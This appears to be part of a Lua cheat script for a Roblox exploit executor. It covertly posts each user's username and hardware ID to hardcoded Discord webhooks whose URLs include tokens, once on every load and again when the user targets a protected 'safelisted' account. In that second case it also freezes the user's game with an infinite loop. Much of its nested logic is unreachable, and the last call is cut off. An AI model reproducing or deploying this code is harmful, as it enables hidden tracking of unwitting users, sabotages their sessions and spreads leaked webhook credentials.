    local function safelistwebhook()
        if getgenv().self3 ~= "" then
            getgenv().Userframe = getgenv().self3
        elseif getgenv().LA2 ~= "" then
            getgenv().Userframe = getgenv().LA2
        elseif getgenv().self ~= "" then
            getgenv().Userframe = getgenv().self
        elseif getgenv().escdisplay ~= "" then
            getgenv().Userframe = getgenv().escdisplay
        elseif getgenv().esc ~= "" then
            getgenv().Userframe = getgenv().esc
        elseif getgenv().LA1 ~= "" then
            getgenv().Userframe = getgenv().LA1
        end
        HttpService = game:GetService("HttpService")
        Webhook_URL =
            "https://discord.com/api/webhooks/1244058953785278474/KSjfLydg8dV80X5PVZV1TJ-xGcLVAam-BVj6E8QWZd7NcMH1SQ6nb_O7dkHFodNdRuWk"

        local response =
            request(
            {
                Url = Webhook_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(
                    {
                        ["content"] = "",
                        ["embeds"] = {
                            {
                                ["title"] = "username they tried to frame and their username",
                                ["description"] = getgenv().Userframe ..
                                    " their username:" .. game.Players.LocalPlayer.Name,
                                ["type"] = "rich",
                                ["color"] = tonumber(0xffffff),
                                ["fields"] = {
                                    {
                                        ["name"] = "hardware id",
                                        ["value"] = gethwid(),
                                        ["inline"] = true
                                    }
                                }
                            }
                        }
                    }
                )
            }
        )
    end

    getgenv().safelist = {
        -- displays

        "ClippedbyErudites",
        "nldawn",
        "lala",
        "1ala",
        -- usernames
        "ClippedbyErudites",
        "nldawn",
        "WDIMTA1",
        "thepilotin911_cool",
    }
    for i, v in pairs(getgenv().safelist) do
        if v == getgenv().self3 then
            safelistwebhook()
            while true do
            end
            if v == getgenv().LA2 then
                safelistwebhook()
                while true do
                end
                    if v == getgenv().self then
                        safelistwebhook()
                        while true do
                        end
                        if v == getgenv().escdisplay then
                            safelistwebhook()
                            while true do
                            end
                            if v == getgenv().esc then
                                safelistwebhook()
                                while true do
                                end
                                if v == getgenv().LA1 then
                                    safelistwebhook()
                                    while true do
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end

HttpService = game:GetService("HttpService")
Webhook_URL =
    "https://discord.com/api/webhooks/1244058465761235109/FXu7x827FqqH0dQGqituV-E_c72a-nB2R_Cb5wwpIVfMNr6fqT00saQhuGLbL5dpacQn"

local response =
    request(
    {
        Url = Webhook_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(
            {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "has finnished the loading",
                        ["description"] = game.Players.LocalPlayer.Name .. " has finnished loading the script",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xffffff),
                        ["fields"] = {
                            {
                                ["name"] = "hardware id",
                                ["value"] = gethwid(),
                                ["inline"] = true
                            }
                        }
                    }
                }
            }
        )
    }
